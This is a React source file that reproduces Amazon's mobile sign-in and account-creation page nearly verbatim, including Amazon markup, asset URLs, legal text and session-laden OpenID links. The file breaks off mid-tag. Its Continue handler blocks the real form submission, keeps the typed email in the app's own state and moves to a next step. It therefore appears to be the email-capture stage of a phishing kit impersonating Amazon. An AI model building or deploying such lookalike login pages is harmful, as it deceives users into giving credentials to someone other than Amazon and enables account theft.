import React, { useState } from 'react';

export default function EmailMobile({
    email,
    setEmail,
    showErrorEmail,
    setShowErrorEmail,
    emptyEmail,
    setEmptyEmail,
    setNavigate,
}) {
    const handleInputChange = (event) => {
        setEmail(event.target.value);
    };

    const handleContinueClick = (event) => {
        event.preventDefault();
        if (email.trim() === '') {
            setEmptyEmail(true);
            setShowErrorEmail(false);
        } else if (email.includes('@')) {
            setShowErrorEmail(false);
            setEmptyEmail(false);

            setNavigate(true);
        } else {
            setShowErrorEmail(true);
            setEmptyEmail(false);
        }
    };

    return (
        <div id="a-page">
            <div className="a-section a-spacing-none">
                <img
                    src="https://m.media-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB588007131_.png"
                    className="display-none"
                    alt=""
                />
                <header
                    id="nav-main"
                    data-nav-language="en_US"
                    className="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven"
                >
                    <div
                        id="navbar"
                        cel_widget_id="Navigation-mobile-navbar"
                        role="navigation"
                        aria-label="navigation"
                        className="nav-t-basicNoAuth nav-sprite-v3 celwidget"
                        data-csa-c-id="zashzv-680a9h-zhoqmq-vt43ih"
                    >
                        <div id="nav-logobar">
                            <div className="nav-left">
                                <div id="nav-logo">
                                    <a
                                        href="/ref=navm_hdr_logo"
                                        id="nav-logo-sprites"
                                        className="nav-logo-link nav-progressive-attribute"
                                        aria-label="Amazon"
                                    >
                                        <span className="nav-sprite nav-logo-base"></span>
                                        <span
                                            id="logo-ext"
                                            className="nav-sprite nav-logo-ext nav-progressive-content"
                                        ></span>
                                        <span className="nav-logo-locale">
                                            .us
                                        </span>
                                    </a>
                                </div>
                            </div>
                            <div className="nav-right"></div>
                        </div>
                    </div>

                    <div id="nav-progressive-subnav"></div>
                </header>

                <a id="skippedLink" tabIndex="-1"></a>
            </div>

            <div className="a-container">
                <div className="a-section a-spacing-none"></div>

                <div className="a-section a-spacing-none auth-pagelet-mobile-container">
                    {showErrorEmail && (
                        <div
                            id="auth-warning-message-box"
                            className="a-box a-alert a-alert-warning auth-server-side-message-box a-spacing-base"
                            aria-live="polite"
                            aria-atomic="true"
                        >
                            <div className="a-box-inner a-alert-container">
                                <h4 className="a-alert-heading">
                                    No account found with email address
                                </h4>
                                <div className="a-alert-content">
                                    <ul
                                        className="a-unordered-list a-nostyle a-vertical"
                                        role="alert"
                                    >
                                        <li>
                                            <span className="a-list-item">
                                                Please check your email address
                                                or click Create Account if you
                                                are new to Amazon.
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                <div className="a-section a-spacing-none auth-pagelet-mobile-container">
                    {emptyEmail && (
                        <div
                            id="auth-warning-message-box"
                            className="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"
                            aria-live="polite"
                            aria-atomic="true"
                        >
                            <div className="a-box-inner a-alert-container">
                                <h4 className="a-alert-heading">
                                    There was a problem
                                </h4>
                                <div className="a-alert-content">
                                    <ul
                                        className="a-unordered-list a-nostyle a-vertical"
                                        role="alert"
                                    >
                                        <li>
                                            <li id="auth-password-missing-alert">
                                                <span className="a-list-item">
                                                    {' '}
                                                    Enter your password{' '}
                                                </span>
                                            </li>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                <div className="a-section auth-pagelet-mobile-container">
                    <div
                        id="auth-alert-window"
                        className="a-box a-alert a-alert-error a-spacing-small"
                        role="alert"
                    >
                        <div className="a-box-inner a-alert-container">
                            <h4 className="a-alert-heading">
                                There was a problem
                            </h4>
                            <div className="a-alert-content">
                                <ul
                                    className="a-unordered-list a-vertical auth-error-messages"
                                    role="alert"
                                >
                                    <li id="auth-customerName-missing-alert">
                                        <span className="a-list-item">
                                            {' '}
                                            Enter your name{' '}
                                        </span>
                                    </li>
                                    <li id="auth-customerNamePronunciation-missing-alert">
                                        <span className="a-list-item">
                                            Enter your name pronunciation
                                        </span>
                                    </li>
                                    <li id="auth-phoneNumber-missing-alert">
                                        <span className="a-list-item">
                                            {' '}
                                            Enter your mobile number{' '}
                                        </span>
                                    </li>
                                    <li id="auth-phoneNumber-invalid-phone-alert">
                                        <span className="a-list-item">
                                            The mobile number you entered does
                                            not seem to be valid
                                        </span>
                                    </li>
                                    <li id="auth-email-missing-alert">
                                        <span className="a-list-item">
                                            Enter your email or mobile phone
                                            number
                                        </span>
                                    </li>
                                    <li id="auth-password-missing-alert">
                                        <span className="a-list-item">
                                            {' '}
                                            Enter your password{' '}
                                        </span>
                                    </li>
                                    <li id="auth-password-invalid-password-alert">
                                        <span className="a-list-item">
                                            Passwords must be at least 6
                                            characters.
                                        </span>
                                    </li>
                                    <li id="auth-guess-missing-alert">
                                        <span className="a-list-item">
                                            Enter the characters as they are
                                            given in the challenge.
                                        </span>
                                    </li>
                                    <li id="auth-email-invalid-email-alert">
                                        <span className="a-list-item">
                                            Enter a valid email address
                                        </span>
                                    </li>
                                    <li id="auth-signin-legal-agreement-checkbox-unchecked-alert">
                                        <span className="a-list-item">
                                            Please read and agree to Amazon's
                                            Conditions of Use and Privacy Policy
                                        </span>
                                    </li>
                                    <li id="auth-cbdtAgreementCheckBox-unchecked-alert">
                                        <span className="a-list-item">
                                            To create an account with Amazon,
                                            please agree to our Conditions of
                                            Use and Sale and our Privacy Policy
                                        </span>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <div
                        id="outer-accordion-signin-signup-page"
                        className="a-section"
                    >
                        <h2>Welcome</h2>

                        <div
                            id="accordion-signin-signup-page"
                            data-a-accordion-name="accordion-signin-signup-page"
                            className="a-box-group a-accordion a-spacing-medium a-spacing-top-mini"
                            role="radioGroup"
                        >
                            <div
                                id="accordion-row-register"
                                className="a-box"
                                data-a-accordion-row-name="accordion-row-register"
                            >
                                <div className="a-box-inner a-accordion-row-container">
                                    <div
                                        className="a-accordion-row-a11y"
                                        role="radio"
                                        aria-checked="false"
                                        aria-expanded="false"
                                    >
                                        <a
                                            id="register_accordion_header"
                                            data-csa-c-func-deps="aui-da-a-accordion"
                                            data-csa-c-type="widget"
                                            data-csa-interaction-events="click"
                                            data-action="a-accordion"
                                            className="a-accordion-row a-declarative"
                                            href="https://www.amazon.com/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=anywhere_us&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=B32C7Y5CS4FTRYHW882J&amp;openid.assoc_handle=anywhere_v2_us&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiI1ODdIYW9rRjFzZDhhQ3JGYnlmWWV3PT0iLCJJViI6IndXbDkyekg3eE44SXlyUDZQRGREM2c9PSIsInZlcnNpb24iOjF9&amp;failedSignInCount=1&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1709572545000"
                                            aria-label=""
                                            data-csa-c-id="xi6y98-8v6thy-f49yg2-sggllv"
                                        >
                                            <i className="a-icon a-accordion-radio a-icon-radio-inactive"></i>
                                            <h5>
                                                <div className="a-row">
                                                    <span className="a-size-base a-text-bold">
                                                        Create account
                                                    </span>

                                                    <span className="a-size-small accordionHeaderMessage">
                                                        {' '}
                                                        New to Amazon?
                                                    </span>
                                                </div>
                                            </h5>
                                        </a>
                                    </div>

                                    <div className="a-accordion-inner">
                                        <span
                                            className="a-declarative"
                                            data-action="a-modal"
                                            data-csa-c-type="widget"
                                            data-csa-c-func-deps="aui-da-a-modal"
                                            data-a-modal='{"max-width":"95%","width":"300px","name":"verifyContinueModal","header":"Verification Required","height":"240px"}'
                                            id="auth-verify-modal-action"
                                            data-csa-c-id="wd4lo8-qvd5np-6ryi95-3goyl4"
                                        ></span>

                                        <div
                                            className="a-popover-preload"
                                            id="a-popover-verifyContinueModal"
                                        >
                                            <div className="a-row">
                                                <p>
                                                    We will send you a text to
                                                    verify this number:
                                                </p>
                                            </div>

                                            <div className="a-row">
                                                <span
                                                    id="auth-register-verify-mobile-number-text"
                                                    className="a-size-small a-text-bold"
                                                >
                                                    <span id="auth-verify-mobile-country-code"></span>
                                                    <span>
                                                        +
                                                        <span id="auth-verify-mobile-calling-code"></span>
                                                    </span>
                                                    <span id="auth-verify-mobile-national-number"></span>
                                                </span>
                                            </div>

                                            <div className="a-row a-spacing-top-extra-large">
                                                <span className="a-size-mini">
                                                    Message and Data rates may
                                                    apply.
                                                </span>
                                            </div>

                                            <hr
                                                aria-hidden="true"
                                                className="a-divider-normal"
                                            />

                                            <div className="a-row">
                                                <div className="a-column a-span6">
                                                    <span
                                                        className="a-declarative"
                                                        data-action="a-popover-close"
                                                        data-csa-c-type="widget"
                                                        data-csa-c-func-deps="aui-da-a-popover-close"
                                                        data-a-popover-close="{}"
                                                        data-csa-c-id="gda2xp-5qgt6j-jkgvdf-9f7oyg"
                                                    >
                                                        <span
                                                            id="auth-verification-cancel"
                                                            className="a-button a-button-span12 a-button-base"
                                                        >
                                                            <span className="a-button-inner">
                                                                <input
                                                                    className="a-button-input"
                                                                    type="submit"
                                                                    aria-labelledby="auth-verification-cancel-announce"
                                                                />
                                                                <span
                                                                    id="auth-verification-cancel-announce"
                                                                    className="a-button-text"
                                                                    aria-hidden="true"
                                                                >
                                                                    Cancel
                                                                </span>
                                                            </span>
                                                        </span>
                                                    </span>
                                                </div>

                                                <div className="a-column a-span6 a-span-last">
                                                    <span
                                                        className="a-declarative"
                                                        data-action="auth-verify-modal-complete"
                                                        data-csa-c-type="widget"
                                                        data-csa-c-func-deps="aui-da-auth-verify-modal-complete"
                                                        data-auth-verify-modal-complete="{}"
                                                        data-csa-c-id="9rh7xz-4jpjj9-xpyrvb-vtznbc"
                                                    >
                                                        <span
                                                            id="auth-verification-ok"
                                                            className="a-button a-button-span12 a-button-primary"
                                                        >
                                                            <span className="a-button-inner">
                                                                <button
                                                                    id="auth-verification-ok-announce"
                                                                    className="a-button-text"
                                                                    type="button"
                                                                >
                                                                    OK
                                                                </button>
                                                            </span>
                                                        </span>
                                                    </span>
                                                </div>
                                            </div>
                                        </div>

                                        <div className="a-section a-spacing-large mp_reg_fix">
                                            <form
                                                id="ap_register_form"
                                                name="register"
                                                method="post"
                                                noValidate=""
                                                action="https://www.amazon.com/ap/register"
                                                data-enable-mobile-account-js="true"
                                                data-show-optional-email-field="true"
                                                className="ap_ango_default fwcim-form auth-validate-form auth-clearable-form"
                                            >
                                                <div className="a-row a-spacing-base">
                                                    <label
                                                        htmlFor="ap_customer_name"
                                                        aria-hidden="true"
                                                        className="a-form-label"
                                                    >
                                                        First and last name
                                                    </label>
                                                    <div className="a-input-text-wrapper auth-required-field accordionFontFamily">
                                                        <input
                                                            type="text"
                                                            maxLength="50"
                                                            id="ap_customer_name"
                                                            autoComplete="name"
                                                            name="customerName"
                                                            aria-label="First and last name"
                                                        />
                                                    </div>

                                                    <div
                                                        id="ap_customer_name_icon"
                                                        className="auth-clear-icons display-none"
                                                        tabIndex=""
                                                    >
                                                        <i
                                                            className="a-icon a-icon-close"
                                                            role="img"
                                                            aria-label="Clear customer name text field, button"
                                                        ></i>
                                                    </div>

                                                    <div
                                                        id="auth-customerName-missing-alert"
                                                        className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
                                                        role="alert"
                                                    >
                                                        <div className="a-box-inner a-alert-container">
                                                            <i className="a-icon a-icon-alert"></i>
                                                            <div className="a-alert-content">
                                                                Enter your name
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <input
                                                    type="hidden"
                                                    name="countryCode"
                                                    value="US"
                                                    id="auth-country-picker"
                                                    className="auth-country-picker"
                                                    disabled="disabled"
                                                />

                                                <div className="a-row a-spacing-base">
                                                    <label
                                                        htmlFor="ap_email"
                                                        aria-hidden="true"
                                                        className="a-form-label"
                                                    >
                                                        Mobile number or email
                                                    </label>
                                                    <div
                                                        data-validation-id="email"
                                                        className="a-input-text-wrapper auth-required-field auth-require-claim-validation moa-single-claim-input-field-container"
                                                    >
                                                        <div className="a-section country-picker aok-hidden display-none">
                                                            <span
                                                                className="a-declarative"
                                                                data-action="a-sheet"
                                                                data-csa-c-type="widget"
                                                                data-csa-c-func-deps="aui-da-a-sheet"
                                                                data-a-sheet='{"sheetType":"web","name":"country_bottom_sheet","preloadDomId":"country_bottom_sheet_container","closeType":"icon"}'
                                                                data-csa-c-id="g0g2oq-vhs77a-6vvy3k-ak9okg"
                                                            >
                                                                <span className="country-display-text">
                                                                    US +1
                                                                </span>
                                                            </span>
                                                        </div>
                                                        <input
                                                            type="email"
                                                            maxLength="64"
                                                            id="ap_email"
                                                            autoComplete="tel"
                                                            name="email"
                                                            aria-label="Mobile number or email"
                                                            autoCorrect="off"
                                                            autoCapitalize="off"
                                                            className="auth-clear-icon-visible"
                                                        />
                                                        <div
                                                            id="ap_email_icon"
                                                            className="auth-clear-icons block"
                                                            tabIndex=""
                                                        >
                                                            <i
                                                                className="a-icon a-icon-close"
                                                                role="img"
                                                                aria-label="Clear email text field, button"
                                                            ></i>
                                                        </div>
                                                    </div>

                                                    <div
                                                        id="auth-email-missing-alert"
                                                        className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
                                                        role="alert"
                                                    >
                                                        <div className="a-box-inner a-alert-container">
                                                            <i className="a-icon a-icon-alert"></i>
                                                            <div className="a-alert-content">
                                                                Enter your email
                                                                or mobile phone
                                                                number
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div
                                                        id="auth-email-invalid-claim-alert"
                                                        className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
                                                        role="alert"
                                                    >
                                                        <div className="a-box-inner a-alert-container">
                                                            <i className="a-icon a-icon-alert"></i>
                                                            <div className="a-alert-content">
                                                                Wrong or Invalid
                                                                email address or
                                                                mobile phone
                                                                number. Please
                                                                correct and try
                                                                again.
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div
                                                        id="country_bottom_sheet_container"
                                                        className="aok-hidden"
                                                    >
                                                        <div className="a-container ap-no-padding">
                                                            <span
                                                                className="a-declarative"
                                                                data-action="select_country"
                                                                data-csa-c-type="widget"
                                                                data-csa-c-func-deps="aui-da-select_country"
                                                                data-select_country="{}"
                                                                data-csa-c-id="ytgr60-bgez1g-7iayjn-33pndb"
                                                            ></span>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div id="auth-register-mobile-custom-message"></div>

                                                <label
                                                    htmlFor="ap_password"
                                                    aria-hidden="true"
                                                    className="a-form-label"
                                                >
                                                    Create a password
                                                </label>

                                                <div className="a-row a-spacing-small">
                                                    <div className="a-row auth-password-row">
                                                        <div
                                                            id="auth-password-container"
                                                            className="a-input-text-wrapper auth-required-field auth-require-password-validation auth-inline-password-container auth-password-container auth-password input_table_layout"
                                                        >
                                                            <input
                                                                type="password"
                                                                maxLength="1024"
                                                                id="ap_password"
                                                                name="password"
                                                                spellCheck="false"
                                                                aria-label="Create a password"
                                                                autoCorrect="off"
                                                                autoCapitalize="off"
                                                            />
                                                        </div>

                                                        <div
                                                            id="ap_password_icon"
                                                            className="auth-clear-icons display-none"
                                                            tabIndex=""
                                                        >
                                                            <i
                                                                className="a-icon a-icon-close"
                                                                role="img"
                                                                aria-label="Clear password text field, button"
                                                            ></i>
                                                        </div>
                                                    </div>

                                                    <div
                                                        id="passwordInformationMessage"
                                                        className="a-section a-spacing-top-mini auth-inlined-information-message aok-hidden"
                                                    >
                                                        Minimum 6 characters
                                                        required
                                                    </div>

                                                    <div
                                                        id="auth-password-missing-alert"
                                                        className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-small a-spacing-top-mini"
                                                        role="alert"
                                                    >
                                                        <div className="a-box-inner a-alert-container">
                                                            <i className="a-icon a-icon-alert"></i>
                                                            <div className="a-alert-content">
                                                                Minimum 6
                                                                characters
                                                                required
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div
                                                        id="auth-password-invalid-password-alert"
                                                        className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-small a-spacing-top-mini"
                                                        role="alert"
                                                    >
                                                        <div className="a-box-inner a-alert-container">
                                                            <i className="a-icon a-icon-alert"></i>
                                                            <div className="a-alert-content">
                                                                Minimum 6
                                                                characters
                                                                required
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div className="a-row auth-visible-password-container auth-show-password-empty">
                                                        <span
                                                            id="auth-visible-password"
                                                            className="a-size-small a-color-secondary auth-visible-password"
                                                        ></span>
                                                    </div>

                                                    <input
                                                        type="hidden"
                                                        name="showPasswordChecked"
                                                        value="true"
                                                        id="ap_show_password_checked"
                                                    />
                                                </div>

                                                <div className="a-row">
                                                    <div className="a-column a-span12 a-spacing-medium">
                                                        <div
                                                            id="auth-show-password-checkbox-container"
                                                            className="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"
                                                        >
                                                            <label htmlFor="auth-register-show-password-checkbox">
                                                                <input
                                                                    id="auth-register-show-password-checkbox"
                                                                    type="checkbox"
                                                                    name=""
                                                                    value=""
                                                                    checked=""
                                                                />
                                                                <i className="a-icon a-icon-checkbox"></i>
                                                                <span className="a-label a-checkbox-label">
                                                                    <span className="a-size-small auth-password-margin">
                                                                        Show
                                                                        password
                                                                    </span>
                                                                </span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div className="a-section ap_mobile_number_fields">
                                                    <span
                                                        id="auth-continue"
                                                        className="a-button a-spacing-medium a-button-primary"
                                                    >
                                                        <span className="a-button-inner">
                                                            <input
                                                                id="continue"
                                                                className="a-button-input max-h"
                                                                type="submit"
                                                                onClick={
                                                                    handleContinueClick
                                                                }
                                                                aria-labelledby="auth-continue-announce"
                                                            />
                                                            <span
                                                                id="auth-continue-announce"
                                                                className="a-button-text"
                                                                aria-hidden="true"
                                                            >
                                                                <span className="default-text aok-hidden display-none">
                                                                    Continue
                                                                </span>
                                                                <span className="phone-text aok-hidden display-none">
                                                                    Verify
                                                                    mobile
                                                                    number
                                                                </span>
                                                                <span className="email-text">
                                                                    Verify email
                                                                </span>
                                                            </span>
                                                        </span>
                                                    </span>
                                                </div>

                                                <div
                                                    id="legal-section"
                                                    className="a-section"
                                                >
                                                    <div
                                                        id="legalTextRow"
                                                        className="a-row a-spacing-top-medium a-size-small"
                                                    >
                                                        By creating an account,
                                                        you agree to Amazon's
                                                        <a href="/gp/aw/help/ref=ap_mobile_register_notification_condition_of_use?id=508088">
                                                            Conditions of Use
                                                        </a>
                                                        and
                                                        <a href="/gp/aw/help/ref=ap_mobile_register_notification_privacy_notice?id=468496">
                                                            Privacy Notice
                                                        </a>
                                                        .
                                                    </div>
                                                </div>

                                                <div
                                                    id="ab-reg-link-section"
                                                    className="a-section"
                                                >
                                                    <div className="a-divider a-divider-break">
                                                        <h5 aria-level="5">
                                                            Buying for work?
                                                        </h5>
                                                    </div>

                                                    <a
                                                        id="ab-registration-link"
                                                        href="https://www.amazon.com/business/register/org/landing?ref_=ap_altreg_ab"
                                                        className="a-touch-link a-box a-touch-link-noborder"
                                                    >
                                                        <div className="a-box-inner">
                                                            <i className="a-icon a-icon-touch-link"></i>
                                                            Create a free
                                                            business account
                                                        </div>
                                                    </a>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div
                                id="accordion-row-login"
                                className="a-box a-accordion-active"
                                data-a-accordion-row-name="accordion-row-login"
                            >
                                <div className="a-box-inner a-accordion-row-container">
                                    <div
                                        className="a-accordion-row-a11y"
                                        role="radio"
                                        aria-checked="true"
                                        aria-expanded="true"
                                    >
                                        <a
                                            id="login_accordion_header"
                                            data-csa-c-func-deps="aui-da-a-accordion"
                                            data-csa-c-type="widget"
                                            data-csa-interaction-events="click"
                                            data-action="a-accordion"
                                            className="a-accordion-row a-declarative"
                                            href="https://www.amazon.com/ap/signin?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=anywhere_us&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=B32C7Y5CS4FTRYHW882J&amp;openid.assoc_handle=anywhere_v2_us&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiI1ODdIYW9rRjFzZDhhQ3JGYnlmWWV3PT0iLCJJViI6IndXbDkyekg3eE44SXlyUDZQRGREM2c9PSIsInZlcnNpb24iOjF9&amp;failedSignInCount=1&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1709572545000"
                                            aria-label=""
                                            data-csa-c-id="mrns06-r4ml4j-hirbbt-azm232"
                                        >
                                            <i className="a-icon a-accordion-radio a-icon-radio-active"></i>
                                            <h5>
                                                <div className="a-row">
                                                    <span className="a-size-base a-text-bold">
                                                        Sign in
                                                    </span>

                                                    <span className="a-size-small accordionHeaderMessage">
                                                        {' '}
                                                        Already a customer?
                                                    </span>
                                                </div>
                                            </h5>
                                        </a>
                                    </div>

                                    <div className="a-accordion-inner">
                                        <form
                                            id="ap_login_form"
                                            name="signIn"
                                            method="post"
                                            noValidate=""
                                            action="https://www.amazon.com/ap/signin"
                                            className="auth-validate-form fwcim-form auth-clearable-form"
                                            data-fwcim-id="PPfQwsKP"
                                        >
                                            <div
                                                id="passkey-error-alert"
                                                className="a-box a-alert a-alert-error aok-hidden"
                                                role="alert"
                                            >
                                                <div className="a-box-inner a-alert-container">
                                                    <h4 className="a-alert-heading">
                                                        Passkey error
                                                    </h4>
                                                    <div className="a-alert-content">
                                                        <p id="passkey-client-error-message">
                                                            Something went
                                                            wrong, please
                                                            sign-in another way
                                                            or follow any
                                                            instructions
                                                            provided by your
                                                            device.
                                                        </p>
                                                        <p
                                                            id="passkey-generic-server-error-message"
                                                            className="aok-hidden"
                                                        >
                                                            Sorry, your passkey
                                                            isn't working. There
                                                            might be a problem
                                                            with the server.
                                                            Sign in with your
                                                            password or try your
                                                            passkey again later.
                                                        </p>
                                                        <p
                                                            id="passkey-server-error-message"
                                                            className="aok-hidden"
                                                        ></p>
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="a-input-text-group a-spacing-medium a-spacing-top-micro">
                                                <label
                                                    htmlFor="ap_email_login"
                                                    aria-hidden="true"
                                                    className="a-form-label"
                                                >
                                                    Email or phone number
                                                </label>

                                                <div className="a-row a-spacing-base">
                                                    <span
                                                        className="a-declarative"
                                                        data-action="country_picker_bottom_sheet"
                                                        data-csa-c-type="widget"
                                                        data-csa-c-func-deps="aui-da-country_picker_bottom_sheet"
                                                        data-country_picker_bottom_sheet="{}"
                                                        data-csa-c-id="xl6a0u-otpo9b-u56lwn-22i9p8"
                                                    >
                                                        <div className="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container">
                                                            <div
                                                                className="a-section country-picker aok-hidden display-none"
                                                                value="US"
                                                            >
                                                                <span
                                                                    className="a-declarative"
                                                                    data-action="a-sheet"
                                                                    data-csa-c-type="widget"
                                                                    data-csa-c-func-deps="aui-da-a-sheet"
                                                                    data-a-sheet='{"sheetType":"web","name":"country_bottom_sheet_signin","preloadDomId":"country_bottom_sheet_container_signin","closeType":"icon"}'
                                                                    data-csa-c-id="b2b6oq-bc658w-1i58fh-m711z1"
                                                                >
                                                                    <span className="country-display-text">
                                                                        US +1
                                                                    </span>
                                                                </span>
                                                            </div>
                                                            <input
                                                                type="email"
                                                                maxLength="128"
                                                                value={email}
                                                                onChange={
                                                                    handleInputChange
                                                                }
                                                                id="ap_email_login"
                                                                name="email"
                                                                aria-label="Email or phone number"
                                                                autoCorrect="off"
                                                                autoCapitalize="off"
                                                                className="auth-clear-icon-visible"
                                                            />
                                                            <div
                                                                id="ap_email_login_icon"
                                                                className="auth-clear-icons block"
                                                                tabIndex=""
                                                            >
                                                                <i
                                                                    className="a-icon a-icon-close"
                                                                    role="img"
                                                                    aria-label="Clear email text field, button"
                                                                ></i>
                                                            </div>
                                                        </div>
                                                    </span>

                                                    <div
                                                        id="country_bottom_sheet_container_signin"
                                                        className="aok-hidden"
                                                    >
                                                        <div className="a-container ap-no-padding">
                                                            <span
                                                                className="a-declarative"
                                                                data-action="select_country_signin"
                                                                data-csa-c-type="widget"
                                                                data-csa-c-func-deps="aui-da-select_country_signin"
                                                                data-select_country_signin="{}"
                                                                data-csa-c-id="b6p8sl-1afry1-vme46z-71xx61"
                                                            ></span>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div
                                                    id="auth-email-missing-alert"
                                                    className="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini"
                                                    role="alert"
                                                >
                                                    <div className="a-box-inner a-alert-container">
                                                        <i className="a-icon a-icon-alert"></i>
                                                        <div className="a-alert-content">
                                                            Enter your email or
                                                            mobile phone number
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="a-row"></div>

                                            <div className="a-section">
                                                <div className="a-button-stack">
                                                    <span
                                                        id="continue"
                                                        className="a-button a-button-span12 a-button-primary"
                                                        onClick={
                                                            handleContinueClick
                                                        }
                                                    >
                                                        <span className="a-button-inner">
                                                            <input
                                                                id="continue"
                                                                className="a-button-input"
                                                                type="submit"
                                                                aria-labelledby="continue-announce"
                                                            />
                                                            <span
                                                                id="continue-announce"
                                                                className="a-button-text"
                                                                aria-hidden="true"
                                                            >
                                                                Continue
                                                            </span>
                                                        </span>
                                                    </span>

                                                    <div className="a-section a-spacing-medium">
                                                        <div
                                                            id="legalTextRow"
                                                            className="a-row a-spacing-top-medium a-size-small"
                                                        >
                                                            By continuing, you
                                                            agree to Amazon's
                                                            <a href="/gp/aw/help/ref=ap_mobile_signin_notification_condition_of_use?id=508088">
                                                                {' '}
                                                                Conditions of
                                                                Use{' '}
                                                            </a>
                                                            and
                                                            <a href="/gp/aw/help/ref=ap_mobile_signin_notification_privacy_notice?id=468496">
                                                                {' '}
                                                                Privacy Notice
                                                            </a>
                                                            .
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="a-section">
                                                <div className="a-row a-expander-container a-expander-inline-container">
                                                    <a
                                                        data-csa-c-func-deps="aui-da-a-expander-toggle"
                                                        data-csa-c-type="widget"
                                                        data-csa-interaction-events="click"
                                                        aria-expanded="false"
                                                        role="button"
                                                        href="/"
                                                        data-action="a-expander-toggle"
                                                        className="a-expander-header a-declarative a-expander-inline-header a-link-expander"
                                                        data-a-expander-toggle='{"allowLinkDefault":true, "expand_prompt":"", "collapse_prompt":""}'
                                                        data-csa-c-id="8ou29d-cvmb0w-bm30ls-rufiuv"
                                                    >
                                                        <i className="a-icon a-icon-expand"></i>
                                                        <span className="a-expander-prompt">
                                                            Need help?
                                                        </span>
                                                    </a>
                                                    <ul className="a-unordered-list a-nostyle a-vertical">
                                                        <li>
                                                            <span className="a-list-item">
                                                                <div
                                                                    aria-expanded="false"
                                                                    className="a-expander-content a-expander-inline-content a-expander-inner display-none"
                                                                >
                                                                    <a
                                                                        id="auth-fpp-link-bottom"
                                                                        className="a-link-normal"
                                                                        href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=5&amp;pageId=anywhere_us&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=B32C7Y5CS4FTRYHW882J&amp;openid.assoc_handle=anywhere_v2_us&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJlMmdmdzhKdE5IU0k1WUROT0FXZVB3PT0iLCJ2ZXJzaW9uIjoxLCJJViI6IjBaY2d6akc2bzJGbjA4Z0IzRzBoeGc9PSJ9&amp;failedSignInCount=1&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1709572545000&amp;shouldShowPersistentLabels=true"
                                                                    >
                                                                        Forgot
                                                                        your
                                                                        password?
                                                                    </a>
                                                                </div>
                                                            </span>
                                                        </li>

                                                        <li>
                                                            <span className="a-list-item">
                                                                <div
                                                                    aria-expanded="false"
                                                                    className="a-expander-content a-expander-inline-content a-expander-inner display-none"
                                                                >
                                                                    <a
                                                                        id="ap-other-signin-issues-link"
                                                                        className="a-link-normal"
                                                                        href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8"
                                                                    >
                                                                        Other
                                                                        issues
                                                                        with
                                                                        Sign-In
                                                                    </a>
                                                                </div>
                                                            </span>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </form>

                                        <div
                                            id="ab-signin-link-section"
                                            className="a-section"
                                        >
                                            <hr
                                                aria-hidden="true"
                                                className="a-divider-normal"
                                            />
                                            <div className="a-section a-spacing-micro">
                                                <span className="a-text-bold">
                                                    {' '}
                                                    Buying for work?{' '}
                                                </span>
                                            </div>

                                            <a
                                                id="ab-sign-in-ingress-link"
                                                className="a-link-normal"
